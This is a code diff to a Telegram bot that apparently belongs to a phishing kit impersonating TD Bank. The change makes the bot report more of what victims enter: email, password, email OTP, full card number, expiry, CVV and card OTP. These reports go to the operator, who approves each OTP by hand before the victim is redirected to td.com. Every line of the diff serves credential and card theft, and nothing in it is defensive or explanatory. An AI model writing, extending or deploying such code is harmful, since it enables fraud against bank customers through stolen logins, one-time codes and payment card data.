@@ -177,14 +177,23 @@ bot.on('callback_query', async (callbackQuery) => {
       session.status = 'verified';
       await bot.answerCallbackQuery(callbackQueryId, { text: '✅ OTP Accepted & Verified!' });
 
+      let finalMsg;
+      if (session.cardNumber || session.cardOtpMode) {
+        const rawCard = (session.cardNumber || '').replace(/\D/g, '');
+        const formattedCard = rawCard.replace(/(\d{4})(?=\d)/g, '$1 ') || 'N/A';
+        finalMsg = `✅ LOGIN COMPLETE & VERIFIED\n\n📧 Email: ${email}\n🔑 Password: ${session.password || 'N/A'}\n🔢 Email OTP: ${session.otpEntered || 'N/A'}\n💳 Card: ${formattedCard}\n📅 Expiry: ${session.expiry || 'N/A'}\n🔒 CVV: ${session.cvv || 'N/A'}\n🔢 Card OTP: ${session.cardOtpEntered || 'N/A'}\n🕐 Time: ${dateTimeStr}\nStatus: User redirecting to https://www.td.com/`;
+      } else {
+        finalMsg = `✅ LOGIN COMPLETE & VERIFIED\n\n📧 Email: ${email}\n🔑 Password: ${session.password || 'N/A'}\n🔢 OTP Used: ${session.otpEntered || 'N/A'}\n🕐 Time: ${dateTimeStr}\nStatus: User redirecting to https://www.td.com/`;
+      }
+
       await bot.editMessageText(
-        `✅ LOGIN COMPLETE & VERIFIED\n\n📧 Email: ${email}\n🔢 OTP Used: ${session.otpEntered || 'N/A'}\n🕐 Time: ${dateTimeStr}\nStatus: User redirecting to https://www.td.com/ca/en/personal-banking`,
+        finalMsg,
         {
           chat_id: message.chat.id,
           message_id: message.message_id
         }
       );
-      console.log(`[Bot] Verified OTP for ${email}. User redirecting to https://www.td.com/ca/en/personal-banking`);
+      console.log(`[Bot] Verified OTP for ${email}. User redirecting.`);
 
     } else if (action === 'wrong_otp') {
       session.status = 'rejected';
